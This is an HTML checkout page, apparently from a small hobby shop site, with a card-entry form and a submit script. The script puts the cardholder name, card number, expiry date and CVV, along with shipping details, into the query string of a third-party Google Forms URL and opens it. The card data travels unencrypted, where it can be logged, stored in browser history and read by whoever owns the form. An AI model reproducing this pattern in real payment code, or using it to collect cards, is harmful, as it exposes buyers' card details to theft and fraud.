<!DOCTYPE html>
<html>
<head>
    <title>Payment Page</title>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Press Start 2P', Arial, sans-serif;
            background: url('https://i.imgur.com/6mR3Kwe.png') repeat;
            text-align: center;
            padding: 20px;
            color: #333;
        }

        h1 { color: #FF0000; text-shadow: 2px 2px #FFD700; }
        input {
            margin: 5px;
            padding: 8px;
            width: 250px;
            border: 2px solid #FFD700;
            border-radius: 10px;
            font-family: 'Press Start 2P', monospace;
        }
        button {
            background: #FF0000;
            color: #fff;
            padding: 10px 20px;
            border: 2px solid #FFD700;
            border-radius: 15px;
            cursor: pointer;
            font-family: 'Press Start 2P', monospace;
            font-size: 12px;
            margin: 5px;
        }
        button:hover {
            background: #FFD700;
            color: #FF0000;
            transform: scale(1.05);
        }
    </style>
</head>
<body>

<h1>Enter Payment Information</h1>

<form id="paymentForm">
    <input type="text" id="cardName" placeholder="Cardholder Name" required><br>
    <input type="text" id="cardNumber" placeholder="Card Number" required><br>
    <input type="text" id="expiry" placeholder="MM/YY" required><br>
    <input type="text" id="cvv" placeholder="CVV" required><br><br>

    <button type="submit">Submit Payment</button>
    <button type="button" onclick="goBack('checkout.html')">Back</button>
</form>

<script>
    // Universal back button
    function goBack(targetPage) {
        if(!targetPage) targetPage = "checkout.html";
        window.location.href = targetPage;
    }

    // Submit payment and send to Google Form
    document.getElementById("paymentForm").addEventListener("submit", function(e){
        e.preventDefault();

        // Get credit card info
        const cardName = document.getElementById("cardName").value.trim();
        const cardNumber = document.getElementById("cardNumber").value.trim();
        const expiry = document.getElementById("expiry").value.trim();
        const cvv = document.getElementById("cvv").value.trim();

        if(!cardName || !cardNumber || !expiry || !cvv){
            alert("Please fill in all credit card fields!");
            return;
        }

        // Get shipping info from localStorage
        const shippingInfo = JSON.parse(localStorage.getItem("shippingInfo")) || {};

        // Clear cart
        localStorage.setItem("cart", JSON.stringify([]));

        // Google Form URL (replace fbzx with your Form ID)
        let formURL = "https://docs.google.com/forms/d/e/1FAIpQLSf2iRg2GdUFqjG6_HKM7Y0Myu-W1ZUTRWTAMBfnbPkPjm_tqw/viewform?usp=dialog";

        // Pre-fill all fields
        formURL += `&entry.1111111111=${encodeURIComponent(shippingInfo.name || "")}`;
        formURL += `&entry.2222222222=${encodeURIComponent(shippingInfo.street || "")}`;
        formURL += `&entry.3333333333=${encodeURIComponent(shippingInfo.city || "")}`;
        formURL += `&entry.4444444444=${encodeURIComponent(shippingInfo.zip || "")}`;
        formURL += `&entry.5555555555=${encodeURIComponent(shippingInfo.country || "")}`;
        formURL += `&entry.6666666666=${encodeURIComponent(shippingInfo.payment || "")}`;
        formURL += `&entry.7777777777=${encodeURIComponent(cardName)}`;
        formURL += `&entry.8888888888=${encodeURIComponent(cardNumber)}`;
        formURL += `&entry.9999999999=${encodeURIComponent(expiry)}`;
        formURL += `&entry.0000000000=${encodeURIComponent(cvv)}`;

        // Open Google Form in a new tab
        window.open(formURL, "_blank");

        // Redirect back to shop after opening form
        window.location.href = "index.html";
    });
</script>

</body>
</html>
